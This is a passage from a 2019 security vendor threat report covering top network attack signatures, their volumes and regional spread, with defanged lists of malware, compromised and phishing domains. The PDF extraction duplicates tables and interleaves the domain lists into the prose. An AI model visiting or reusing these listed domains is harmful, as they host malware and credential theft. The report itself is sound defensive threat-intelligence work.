Solaris,\n\n**WEB Brute Force Login -1.1021** Web Attacks Other Unix, Network **[1133407](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133407)** N/A 104,733\n\nDevice, Others\n\n**FILE Adobe Flash Player And AIR**\n**Multiple Vulnerabilities** Access Control Windows **[1130948](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1130948)** CVE-2014-0552 74,416\n**(CVE-2014-0552)**\n\n**EXPLOIT Nodejs js-yaml load()**\n\nWindows, Linux, FreeBSD,\n\n**Code Execution** Misc **[1058051](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1058051)** CVE-2013-4660 65,927\n\nSolaris, Other Unix, Mac OS\n\n**(CVE-2013-4660)**\n\n**WEB Ruby on Rails Where Hash** Windows, Linux, FreeBSD,\nWeb Attacks **[1056282](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1056282)** CVE-2012-2695 65,540\n**SQL Injection (CVE-2012-2695)** Solaris, Mac OS\n\nWindows, Linux, FreeBSD,\n**WEB Directory Traversal -4** Web Attacks **[1049802](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1049802)** CVE-2018-15535 62,545\nSolaris, Other Unix, Mac OS\n\n_Figure 10: Top 10 network attacks in Q2, 2019_\n\n\nWindows, Linux, FreeBSD,\n**WEB SQL injection attempt -33** Web Attacks **[1059160](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1059160)** N/A 645,238\nSolaris, Other Unix\n\nWindows, Linux, FreeBSD,\n\n**WEB Cross-site Scripting -36** Access Control Solaris, Other Unix, Net­ **[1133451](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133451)** CVE-2011-2133 154,330\n\nwork Device\n\nWindows, Linux, FreeBSD,\n**WEB SQL injection attempt -7** Web Attacks **[1054841](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054841)** CVE-2010-0112 125,920\nSolaris, Other Unix\n\n**WEB GNU Bash Remote Code**\n\nLinux, FreeBSD, Solaris,\n\n**Execution -6 (CVE-2014-6271,** Access Control **[1130029](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1130029)** CVE-2014-6271 125,377\n\nOther Unix, Mac OS\n\n**Shellshock)**\n\n**EXPLOIT Adobe Shockwave**\n**Director PAMI Chunk Parsing**\n\nAccess Control Windows **[1054264](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054264)** CVE-2010-2872 107,567\n\n**Memory Corruption**\n**(CVE-2010-2872)**\n\nLinux, FreeBSD, Solaris,\n\n**WEB Brute Force Login -1.1021** Web Attacks Other Unix, Network **[1133407](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133407)** N/A 104,733\n\nDevice, Others\n\n**FILE Adobe Flash Player And AIR**\n**Multiple Vulnerabilities** Access Control Windows **[1130948](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1130948)** CVE-2014-0552 74,416\n**(CVE-2014-0552)**\n\n**EXPLOIT Nodejs js-yaml load()**\n\nWindows, Linux, FreeBSD,\n\n**Code Execution** Misc **[1058051](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1058051)** CVE-2013-4660 65,927\n\nSolaris, Other Unix, Mac OS\n\n**(CVE-2013-4660)**\n\n**WEB Ruby on Rails Where Hash** Windows, Linux, FreeBSD,\nWeb Attacks **[1056282](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1056282)** CVE-2012-2695 65,540\n**SQL Injection (CVE-2012-2695)** Solaris, Mac OS\n\nWindows, Linux, FreeBSD,\n**WEB Directory Traversal -4** Web Attacks **[1049802](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1049802)** CVE-2018-15535 62,545\nSolaris, Other Unix, Mac OS\n\n\n-----\n\n###### Top 10 Network Attack Percentage Overall\n\n**28.5%** Web SQL injection attempt-33\n\n**6.8%** WEB Cross-Site Scripting-36\n\n**5.6%** WEB SQL Injection attempt -7\n\n###### 28.5% 5.5% WEB GNU Bash Remote Code Execution -6 32.40% (CVE-2014-6271, shellshock)\n Top 10\n Exploit Adobe Shock Wave Director PAMI Chunk\n\n**4.7%**\n\n###### Network Parsing Memory Corruption (CVE-2010-2872)\n Attack 4.6% WEB Brute Force Login -1.1021 Percentage FILE Adobe Flash Player and AIR\n\n**3.3%**\n\n###### Overall (multiple vulnerabilities) (CVE-2014-0552)\n 6.8% EXPLOIT Nodejs js-yaml load() Code Execution\n\n**2.9%**\n(CVE-2013-4660)\n\n###### 2.80%\n\nWEB Ruby on Rails Where Hash SQL injection\n\n###### 2.9% 5.6% 2.9% (CVE-2012-26-95\n 2.9%\n 5.5% 2.8% WEB Directory Tranversal -4\n 3.3%\n 4.7% 4.6% 32.40% Non-Top 10 Network Attacks\n\n_Figure 11: Percentage Makeup of Top 10 Attacks vs All_\n\n###### New Network Attacks Let’s analyze the two new top 10 appearances:\n\n**[EXPLOIT Nodejs js-yaml load()](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1058051)**\n\nThis attack accounted for 2.9% of all network attacks by volume. It exploits a vulnerability in the YAML markup\n\nlanguage package JS-YAML for Node.js. Specifically, it exploits how the library parses a custom data type, which\n\nresults in remote code execution (RCE). Obviously, any vulnerability that allows RCE is a huge concern. Develop­\n\ners should always sanitize outside users’ data input.\n\nThe authors patched this vulnerability back in 2013 by replacing the load function with the safeLoad function; it’s\n\nbeen the default since version 2.1.0 forward. Needless to say, if you’re still running an outdated version of Node.js,\n\n[upgrade right away. For more details and a proof of concept, check out this researcher blog post.](https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/)\n\n**[WEB Directory Traversal -4](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1049802)**\n\nThis attack accounted for 2.8% of all IPS hits; just a tad under the previous JS-YAML flaw. Directory traversal\n\nvulnerabilities are flaws that allow access to a part of a filesystem not initially permitted. For instance, a web\n\nserver has a root directory that contains things like the default or index.html page (the first page you see when\n\nopening a website). All users will have access to this root directory, as it’s the starting point of the web server.\n\nHowever, that doesn’t mean web visitors should have access to any non-web directories located on the underly­\n\ning server’s normal filesystem. A directory traversal vulnerability is simply a flaw that allows attackers to bypass\n\nthese filesystem limitations.\n\nSpecifically, this exploit allows web users to escape a web server’s root directory and potentially gain access to\n\nany file on the computer system. The most common target is the “/etc/passwd” file, which is the file storing user\n\nlogin credentials. Granted the passwords are normally hashed, but attackers can still attempt to crack the hashes\n\nand obtain legitimate user login credentials.\n\n\n-----\n\n###### Quarter-Over-Quarter Attack Analysis\n\nThough the volume of quarter-over-quarter network attacks has changed drastically over the\n\nlast year, some things have remained consistent. For instance, SQL injection (SQLi) attacks\n\ncontinue to top our list. Two of the new SQLi attacks from Q1—WEB SQL injection attempt -33\n\nand WEB SQL injection attempt -7 — both carried over to Q2’s top 10 as well. These two SQLi\n\nattacks alone account for over 34% of all network attacks (see figure 11). They also both had a\n\nfairly large QoQ increase, the first jumping over 1,200% and the second over 87%.\n\nFor that matter, nine out of the 10 top network attacks had substantial volume increases this\n\nquarter. For instance, PAMI Chunk Parsing Memory, which debuted the top 10 back in Q2 of\n\n2018, jumped nearly 350% between quarters.\n\n**Signature**\n\n**IPS Signature** **Name** **% Increase/** **Q2** **Q1**\n\n**Decrease**\n\n**[1059160](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1059160&includedIn=Full)** **WEB SQL injection attempt -33** 1,228.39 645,238 48,573\n\n**[1133451](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133451&includedIn=Full)** **WEB Cross-site Scripting -36** 52.93 154,330 100,915\n\n**[1054841](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054841&includedIn=Full)** **WEB SQL injection attempt -7** 87.51 125,920 67,155\n\n**[1133407](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133407&includedIn=Full)** **WEB Brute Force Login -1.1021** 26.68 104,733 82,673\n\n**[1054837](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054837&includedIn=Full)** **WEB Remote File Inclusion /etc/passwd** -43.79 59,705 106,212\n\n**WEB GNU Bash Remote Code Execution -6**\n\n**[1130029](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1130029&includedIn=Full)** 217.56 125,377 39,481\n\n**(CVE-2014-6271, Shellshock)**\n\n**FILE Adobe Flash Player And AIR Multiple**\n\n**[1130948](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1130948&includedIn=Full)** 18.86 74,416 62,607\n\n**Vulnerabilities (CVE-2014-0552)**\n\n**EXPLOIT Adobe Shockwave Director PAMI**\n\n**[1054264](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054264&includedIn=Full)** **Chunk Parsing Memory Corruption** 349.69 107,567 23,920\n\n**(CVE-2010-2872)**\n\n**WEB Ruby on Rails Where Hash SQL Injec­**\n\n**[1056282](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1056282&includedIn=Full)** 4.46 65,540 62,740\n\n**tion (CVE-2012-2695)**\n\n**[1055396](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1055396&includedIn=Full)** **WEB Cross-site Scripting -9** 41.08 52,136 36,954\n\n_Figure 12: Quarter-over-Quarter Review_\n\n|IPS Signature|Name|Signature % Increase/ Decrease|Q2|Q1|\n|---|---|---|---|---|\n|1059160|WEB SQL injection attempt -33|1,228.39 645,238 48,573|||\n|1133451|WEB Cross-site Scripting -36|52.93 154,330 100,915|||\n|1054841|WEB SQL injection attempt -7|87.51 125,920 67,155|||\n|1133407|WEB Brute Force Login -1.1021|26.68 104,733 82,673|||\n|1054837|WEB Remote File Inclusion /etc/passwd|-43.79 59,705 106,212|||\n|1130029|WEB GNU Bash Remote Code Execution -6 (CVE-2014-6271, Shellshock)|217.56 125,377 39,481|||\n|1130948|FILE Adobe Flash Player And AIR Multiple Vulnerabilities (CVE-2014-0552)|18.86 74,416 62,607|||\n|1054264|EXPLOIT Adobe Shockwave Director PAMI Chunk Parsing Memory Corruption (CVE-2010-2872)|349.69 107,567 23,920|||\n|1056282|WEB Ruby on Rails Where Hash SQL Injec­ tion (CVE-2012-2695)|4.46 65,540 62,740|||\n|1055396|WEB Cross-site Scripting -9|41.08 52,136 36,954|||\n\n\n**Signature**\n\n**IPS Signature** **Name** **% Increase/** **Q2** **Q1**\n\n**Decrease**\n\n**[1059160](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1059160&includedIn=Full)** **WEB SQL injection attempt -33** 1,228.39 645,238 48,573\n\n**[1133451](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133451&includedIn=Full)** **WEB Cross-site Scripting -36** 52.93 154,330 100,915\n\n**[1054841](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054841&includedIn=Full)** **WEB SQL injection attempt -7** 87.51 125,920 67,155\n\n**[1133407](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133407&includedIn=Full)** **WEB Brute Force Login -1.1021** 26.68 104,733 82,673\n\n**[1054837](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054837&includedIn=Full)** **WEB Remote File Inclusion /etc/passwd** -43.79 59,705 106,212\n\n**WEB GNU Bash Remote Code Execution -6**\n\n**[1130029](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1130029&includedIn=Full)** 217.56 125,377 39,481\n\n**(CVE-2014-6271, Shellshock)**\n\n**FILE Adobe Flash Player And AIR Multiple**\n\n**[1130948](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1130948&includedIn=Full)** 18.86 74,416 62,607\n\n**Vulnerabilities (CVE-2014-0552)**\n\n**EXPLOIT Adobe Shockwave Director PAMI**\n\n**[1054264](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054264&includedIn=Full)** **Chunk Parsing Memory Corruption** 349.69 107,567 23,920\n\n**(CVE-2010-2872)**\n\n**WEB Ruby on Rails Where Hash SQL Injec­**\n\n**[1056282](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1056282&includedIn=Full)** 4.46 65,540 62,740\n\n**tion (CVE-2012-2695)**\n\n**[1055396](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1055396&includedIn=Full)** **WEB Cross-site Scripting -9** 41.08 52,136 36,954\n\n\n-----\n\n###### Year-over-Year Attack Analysis\n\nAs for the YoY comparison, eight of the top 10 attacks surged since last year. For example.\n\n**[WEB SQL injection attempt -33 spiked over 29,000%, WEB GNU Bash Remote Code Execution -6,](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1059160&includedIn=Full)**\n\n[jumped over 1,300%, and WEB SQL injection attempt -7 increased almost 1,700%. It’s clear that](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054841&includedIn=Full)\n\nSQLi attacks are making a huge comeback. If you manage a web server with a SQL database,\n\nmake sure to follow best hardening and secure coding practices to avoid SQLi vulnerabilities.\n\n[You can visit the Open Web Application Security Project (OWASP) site to learn more about web](http://owasp.org/)\n\napplications security.\n\n**Signature**\n\n**IPS Signature** **Name** **% Increase/** **Q2 2019** **Q2 2018**\n\n**Decrease**\n\n**[1059160](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1059160&includedIn=Full)** **WEB SQL injection attempt -33** 29,149.23 645,238 2,206\n\n**WEB URI Handler Buffer**\n\n**[1133763](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133763&includedIn=Full)** -99.68 1,049 330,385\n\n**Overflow - POST -3**\n\n**[1133451](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133451&includedIn=Full)** **WEB Cross-site Scripting -36** 337.06 154,330 35,311\n\n**[1133407](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133407&includedIn=Full)** **WEB Brute Force Login -1.1021** 88.32 104,733 55,614\n\n**EXPLOIT Adobe Shockwave Director PAMI**\n\n**[1054264](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054264&includedIn=Full)** **Chunk Parsing Memory Corruption** 290.34 107,567 27,557\n\n**(CVE-2010-2872)**\n\n**WEB GNU Bash Remote Code Execution -6**\n\n**[1130029](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1130029&includedIn=Full)** 1344.77 125,377 8,678\n\n**(CVE-2014-6271, Shellshock)**\n\n**[1054841](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054841&includedIn=Full)** **WEB SQL injection attempt -7** 1673.27 125,920 7,101\n\n**FILE Adobe Flash Player And AIR**\n\n**[1130948](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1130948&includedIn=Full)** **Multiple Vulnerabilities** 303.47 74,416 18,444\n\n**(CVE-2014-0552)**\n\n**WEB Ruby on Rails Where Hash SQL**\n\n**[1056282](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1056282&includedIn=Full)** 245.02 65,540 18,996\n\n**Injection (CVE-2012-2695)**\n\n**FILE Microsoft Office Memory**\n\n**[1133223](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133223&includedIn=Full)** **Corruption Vulnerability** -75.93 15,576 63,714\n\n**(CVE-2016-7231)**\n\n_Figure 13: Year-over-Year Review_\n\n|IPS Signature|Name|Signature % Increase/ Decrease|Q2 2019|Q2 2018|\n|---|---|---|---|---|\n|1059160|WEB SQL injection attempt -33|29,149.23|645,238|2,206|\n|1133763|WEB URI Handler Buffer Overflow - POST -3|-99.68|1,049|330,385|\n|1133451|WEB Cross-site Scripting -36|337.06|154,330|35,311|\n|1133407|WEB Brute Force Login -1.1021|88.32|104,733|55,614|\n|1054264|EXPLOIT Adobe Shockwave Director PAMI Chunk Parsing Memory Corruption (CVE-2010-2872)|290.34|107,567|27,557|\n|1130029|WEB GNU Bash Remote Code Execution -6 (CVE-2014-6271, Shellshock)|1344.77|125,377|8,678|\n|1054841|WEB SQL injection attempt -7|1673.27|125,920|7,101|\n|1130948|FILE Adobe Flash Player And AIR Multiple Vulnerabilities (CVE-2014-0552)|303.47|74,416|18,444|\n|1056282|WEB Ruby on Rails Where Hash SQL Injection (CVE-2012-2695)|245.02|65,540|18,996|\n|1133223|FILE Microsoft Office Memory Corruption Vulnerability (CVE-2016-7231)|-75.93|15,576|63,714|\n\n\n**[1059160](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1059160&includedIn=Full)** **WEB SQL injection attempt -33** 29,149.23 645,238 2,206\n\n**WEB URI Handler Buffer**\n\n**[1133763](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133763&includedIn=Full)** -99.68 1,049 330,385\n\n**Overflow - POST -3**\n\n**[1133451](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133451&includedIn=Full)** **WEB Cross-site Scripting -36** 337.06 154,330 35,311\n\n**[1133407](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133407&includedIn=Full)** **WEB Brute Force Login -1.1021** 88.32 104,733 55,614\n\n**EXPLOIT Adobe Shockwave Director PAMI**\n\n**[1054264](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054264&includedIn=Full)** **Chunk Parsing Memory Corruption** 290.34 107,567 27,557\n\n**(CVE-2010-2872)**\n\n**WEB GNU Bash Remote Code Execution -6**\n\n**[1130029](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1130029&includedIn=Full)** 1344.77 125,377 8,678\n\n**(CVE-2014-6271, Shellshock)**\n\n**[1054841](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1054841&includedIn=Full)** **WEB SQL injection attempt -7** 1673.27 125,920 7,101\n\n**FILE Adobe Flash Player And AIR**\n\n**[1130948](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1130948&includedIn=Full)** **Multiple Vulnerabilities** 303.47 74,416 18,444\n\n**(CVE-2014-0552)**\n\n**WEB Ruby on Rails Where Hash SQL**\n\n**[1056282](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1056282&includedIn=Full)** 245.02 65,540 18,996\n\n**Injection (CVE-2012-2695)**\n\n**FILE Microsoft Office Memory**\n\n**[1133223](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133223&includedIn=Full)** **Corruption Vulnerability** -75.93 15,576 63,714\n\n**(CVE-2016-7231)**\n\n\n-----\n\n###### Geographic Attack Distribution\n\nGeographically, the Americas (AMER) received 48% of network attacks. Europe, the Middle East\n\nand Africa (EMEA) saw 47% of attacks and Asia Pacific (APAC) got the meager remaining 5%.\n\nLike our malware section, we also like to look at the most-widespread network attacks. These\n\nattacks may not have the highest raw volume, but they do affect the most unique sites. You can\n\nfind the top five most-widespread attacks and which regions and countries they most affect in\n\nfigure 14 below.\n\n**Signature ID** **Name** **Top 3 Countries by %** **AMER** **EMEA** **APAC**\n\nBrazil Poland Great Britian\n**[1133451](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133451)** **WEB Cross-site Scripting -36** 36.1% 52.1% 11.8%\n\n7.6% 6.3% 5.7%\n\nNew Zealand Poland Great Britian\n**[1059160](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1059160)** **WEB SQL injection attempt -33** 47.2% 39.9% 12.9%\n\n7.5% 6.8% 5.7%\n\nTurkey Poland Brazil\n**[1055396](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1055396)** **WEB Cross-site Scripting -9** 45.8% 43.2% 11.0%\n\n10.2% 6.9% 6.2%\n\n**WEB Ruby on Rails Where Hash** Great Britian Brazil Spain\n**[1056282](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1056282)** 42.2% 51.6% 6.3%\n**SQL Injection (CVE-2012-2695)** 18.0% 10.2% 9.4%\n\nGreat\n\n**WEB Apache Struts XSLTResult** Brazil Venezuela\n**[1132729](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1132729)** Britian 55.7% 39.0% 5.3%\n**File Inclusion (CVE-2016-3082)** 11.8% 6.6%\n\n6.9%\n\n_Figure 14: Top 5 Most-Widespread Network Attacks_\n\nAs for other interesting regional highlights, five of the top 50 network attacks only targeted EMEA.\n\n[These EMEA-confined network attacks included the aforementioned JS-YAML network attack, the](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1058051)\n\n**[OpenX PHP Backdoor Code Execution, another Remote PHP Code Execution, the Novell Login Memory](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1057872)**\n\n**[Corruption, and a URI Handler Buffer Overflow.](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1058134)**\n\n[Furthermore, WScript.Shell Remote Code Execution and OpenSSL TLS DTLS Heartbeat were unique to](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1132517)\n\n[the AMER region, and a single network threat, Generic JavaScript Obfuscation,](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1058769)\n\nwas isolated to APAC.\n\nAt the end of the day, the vast majority of network attacks target web servers, applications,\n\nand clients. So, keep your web-related software patched.\n\n###### Network Attacks by Region\n\n|Signature ID|Name|Top 3 Countries by %|Col4|Col5|AMER|EMEA|APAC|\n|---|---|---|---|---|---|---|---|\n|1133451|WEB Cross-site Scripting -36|Brazil 7.6%|Poland 6.3%|Great Britian 5.7%|36.1%|52.1%|11.8%|\n|1059160|WEB SQL injection attempt -33|New Zealand 7.5%|Poland 6.8%|Great Britian 5.7%|47.2%|39.9%|12.9%|\n|1055396|WEB Cross-site Scripting -9|Turkey 10.2%|Poland 6.9%|Brazil 6.2%|45.8%|43.2%|11.0%|\n|1056282|WEB Ruby on Rails Where Hash SQL Injection (CVE-2012-2695)|Great Britian 18.0%|Brazil 10.2%|Spain 9.4%|42.2%|51.6%|6.3%|\n|1132729|WEB Apache Struts XSLTResult File Inclusion (CVE-2016-3082)|Brazil 11.8%|Great Britian 6.9%|Venezuela 6.6%|55.7%|39.0%|5.3%|\n\n\nBrazil Poland Great Britian\n**[1133451](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1133451)** **WEB Cross-site Scripting -36** 36.1% 52.1% 11.8%\n\n7.6% 6.3% 5.7%\n\nNew Zealand Poland Great Britian\n**[1059160](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1059160)** **WEB SQL injection attempt -33** 47.2% 39.9% 12.9%\n\n7.5% 6.8% 5.7%\n\nTurkey Poland Brazil\n**[1055396](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1055396)** **WEB Cross-site Scripting -9** 45.8% 43.2% 11.0%\n\n10.2% 6.9% 6.2%\n\n**WEB Ruby on Rails Where Hash** Great Britian Brazil Spain\n**[1056282](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1056282)** 42.2% 51.6% 6.3%\n**SQL Injection (CVE-2012-2695)** 18.0% 10.2% 9.4%\n\nGreat\n\n**WEB Apache Struts XSLTResult** Brazil Venezuela\n**[1132729](https://www.watchguard.com/SecurityPortal/ThreatDetail.aspx?rule_id=1132729)** Britian 55.7% 39.0% 5.3%\n**File Inclusion (CVE-2016-3082)** 11.8% 6.6%\n\n6.9%\n\n\n**APAC**\n###### 5%\n\n\n**AMERICAS**\n\n\n###### EMEA\n\n\n-----\n\n##### DNS Analysis WARNING\n\n**All of the domains**\n\nLast quarter, we included statistics from our DNS firewall service\n\n**highlighted in this**\n\nDNSWatch for the first time. DNSWatch works by intercepting Domain\n\n**section have at one**\n\nName System (DNS) requests and sending dangerous connections to\n\n**point hosted or continue**\n\na black hole instead of the malicious destination. Because DNSWatch\n\n**to host malware. Do**\n\nworks on the DNS level, it can detect and block dangerous connections\n\n**not visit any domain in**\n\nindependent of the application protocol for that connection. This\n\n**this section or you risk**\n\nmeans it detects threats ranging from phishing links in emails to botnet\n\n**infecting your system.**\n\ncommand and control on IoT devices.\n\nLast quarter, we highlighted basic statistics from this service including\n\nthe volume of connections blocked and a breakdown of connections blocked within a\n\nfew interesting categories. This quarter, we’ll expand on those interesting categories and\n\nhighlight a few stand-out domains.\n\n**Total Blocked Connections: 5,138,733**\n\nIn Q2 2019, DNSWatch blocked 5,138,733 attempted connections to malicious domains.\n\nThe connections included attempts to steal user credentials through phishing domains,\n\ncompromised websites hosting malware, and command and control connections from\n\nmalware installations on compromised systems. This was a 1% decrease from Q1 2019.\n\nThe majority of connections that DNSWatch blocks are categorized as “generally malicious.”\n\nOutside of that bucket, we have insight into more specific categories for some connections.\n\nWe’ve chosen to highlight three of those categories in this report by analyzing a few of the\n\ntop domains within each of them.\n\n**MALWARE**\n\n###### Top Malware Domains dc44qjwal3p07[.]cloudfront[.]net\n\nA few entries in the top malware domains stand out. First there are my[.]mixtape[.]moe\n\ntwo subdomains on CloudFront.net which is Amazon’s Content Delivery\n\nmoran101[.]duckdns[.]org\n\nNetwork (CDN). Attackers commonly use CDNs like CloudFront and\n\nCloudFlare to prevent detection by services that only look at the root ice[.]ip64[.]net\n\ndomain (CloudFront.net). In the case of both of these subdomains, they\n\nd3i1asoswufp5k[.]cloudfront[.]net\n\nwere caught hosting a browser-hijacking malware attack called Fireball.\n\nFireball has multiple abilities such as changing the default start page canookies[.]com\n\nand search engine for infected browsers to downloading and executing\n\nserver[.]bovine-mena[.]com\n\nadditional malware on infected systems. We first detected this threat\n\nalmost 2 years ago, so it is interesting to see Fireball back on our top blogerjijer[.]pw\n\nlists again.\n\nbright[.]su\n\nAnother interesting domain on the list was my[.]mixtape[.]moe. This kesikelyaf[.]com\n\ndomain was originally created as a legitimate file-sharing domain where\n\n2,265,425\n\nusers could upload images, videos, or anything else they wanted to\n\nshare. This website, however, quickly became a favorite for attackers\n\n\n**MALWARE**\n\ndc44qjwal3p07[.]cloudfront[.]net\n\nmy[.]mixtape[.]moe\n\nmoran101[.]duckdns[.]org\n\nice[.]ip64[.]net\n\nd3i1asoswufp5k[.]cloudfront[.]net\n\ncanookies[.]com\n\nserver[.]bovine-mena[.]com\n\nblogerjijer[.]pw\n\nbright[.]su\n\nkesikelyaf[.]com\n\n2,265,425\n\n\n-----\n\nattempting to host malware. The final straw before we began\n\ndisorderstatus[.]ru\n\nblocking the domain was a macro malware campaign reported by a\n\nWatchGuard customer that used this domain to deliver malware to its differentia[.]ru\n\nvictims. The original creators of the mixtape service are currently in update[.]intelliadmin[.]com\n\nthe process of shutting down the site due to the extreme amount of\n\nmalicious content. www[.]sharebutton[.]co\n\npm2bitcoin[.]com\n\n###### Top Compromised Websites panel[.]vargakragard[.]se\n\nWe use the ‘compromised websites’ tag for otherwise legitimate\n\n0[.]nextyourcontent[.]com\n\nwebsites which an attacker has exploited to host malicious content.\n\nMost commonly, attackers exploit a cross-site scripting (XSS) install[.]pdf-maker[.]com\n\nvulnerability to host malicious JavaScript or an open file upload path\n\nrekovers[.]ru\n\nto store a malware payload. Compromised websites are popular for\n\nattackers because they have typically built up a good reputation with query[.]network\n\nreputation-based security protections. The attackers abuse the good\n\n2,265,425\n\nreputation to bypass many security protections until the reputation\n\nfinally catches up.\n\nWith that said, some of these domains merely appeared legitimate at the time of original\n\nanalysis. We tend to err on the side of caution when there is a chance that a domain is\n\nlegitimate and compromised vs being an entirely malicious domain. In the case of each of\n\nthe top 10 compromised websites in Q2 2019, all 10 of them have either been taken offline\n\nsince detection or turned out to be entirely malicious.\n\nWe first detected the top domain, disorderstatus[.]ru and flagged it as malicious a bit over\n\na year ago. This domain was found to be hosting a command and control server for the\n\nAndromeda malware family.\n\n\n###### Total Blocked Connections:\n\n# 5,138,733\n\n\n-----\n\n###### Top Phishing Domains PHISHING\n\nDomains categorized as “Phishing” almost always exist in structurecdn[.]thememove[.]com\n\nsome form to harvest credentials from unsuspecting users.\n\nonline[.]fliphtml5[.]com\n\nWe’ve commonly seen (and discussed in previous Internet\n\nSecurity Reports) examples of phishing domains that mimic paste[.]ee\n\nOffice 365 or Google Docs authentication portals in an\n\na[.]top4top[.]net\n\nattempt to trick victims into entering their credentials.\n\nAttackers then use these credentials to compromise the uk[.]at[.]atwola[.]com\n\nvictim’s personal or company email account when multi-factor ec2-18-224-214-207[.]us-east-2[.]\n\ncompute[.]amazonaws[.]com\n\nauthentication isn’t in use.\n\nusd383org-my[.]sharepoint[.]com\n\nAttackers tend to host these phishing sites as an HTML file\n\nemail[.]veromailer[.]com\n\nsaved somewhere on a recognizable domain. Amazonaws.\n\ncom is a legitimate Amazon domain for example, but the up[.]top4top[.]net\n\nsubdomain ec2-18-224-214-207[.]us-east-2[.]compute[.]\n\nmytoprightgroup-my[.]sharepoint[.]com\n\namazonaws[.]com hosted a credential-stealing HTML file\n\nunder the attacker’s control. 2,265,425\n\nWe first identified uk[.]at[.]atwola[.]com back in Q2 2018\n\nas a site hosting a phishing page that used compromised email accounts to send out a\n\nfake voicemail notification to victims. The link contained in the email went to a form that\n\nharvested login credentials.\n\n_Figure 15: Fake Voicemail Notification_\n\nMalicious links remain a top threat for organizations of all sizes. Attackers are becoming\n\nincreasingly sophisticated at hiding their malicious intentions in phishing and spear-phishing\n\nattacks. Phishing awareness training for your employees is still one of the best responses\n\nyou can take to the threat of malicious emails, but as we 